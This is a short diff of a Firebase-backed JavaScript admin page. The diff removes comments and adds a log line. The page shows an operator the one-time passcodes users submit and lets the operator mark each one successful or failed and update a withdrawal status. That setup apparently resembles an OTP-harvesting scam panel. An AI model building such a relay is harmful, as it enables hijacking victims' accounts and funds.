@@ -156,7 +156,6 @@ function esc(v) {
 }
 
 function updateOTPDisplay() {
-  // Check user OTP from Firebase
   database.ref('user_otp').once('value').then((snapshot) => {
     const data = snapshot.val();
     if(data && data.otp && data.otp !== lastOtp){
@@ -182,21 +181,19 @@ function clearActivity() {
 }
 
 function cancelTimer() {
-  // 🔥 SEND CANCEL TO FIREBASE - ALL USERS WILL SEE
   database.ref('admin_actions/cancelTimer').set(true);
   document.getElementById('otpStatus').textContent = '⏹ Timer cancelled! All users notified.';
   document.getElementById('otpStatus').style.color = '#dc3545';
+  console.log("🔥 Timer cancelled - Firebase updated");
 }
 
 function sendOTPFailed() {
-  // 🔥 SEND OTP FAILED TO FIREBASE - USER WILL SEE
   database.ref('admin_actions/otpResult').set('failed');
   document.getElementById('userOtpStatus').textContent = '❌ OTP Failed!';
   document.getElementById('userOtpStatus').style.color = '#dc3545';
   document.getElementById('otpStatus').textContent = '❌ OTP Failed! User notified.';
   document.getElementById('otpStatus').style.color = '#dc3545';
   
-  // Update withdrawal status
   database.ref('activities').once('value').then((snapshot) => {
     const data = snapshot.val();
     if(data){
@@ -214,14 +211,12 @@ function sendOTPFailed() {
 }
 
 function sendOTPSuccess() {
-  // 🔥 SEND OTP SUCCESS TO FIREBASE - USER WILL SEE
   database.ref('admin_actions/otpResult').set('success');
   document.getElementById('userOtpStatus').textContent = '✅ OTP Successful!';
   document.getElementById('userOtpStatus').style.color = '#28a745';
   document.getElementById('otpStatus').textContent = '✅ OTP Successful! User notified.';
   document.getElementById('otpStatus').style.color = '#28a745';
   
-  // Update withdrawal status
   database.ref('activities').once('value').then((snapshot) => {
     const data = snapshot.val();
     if(data){
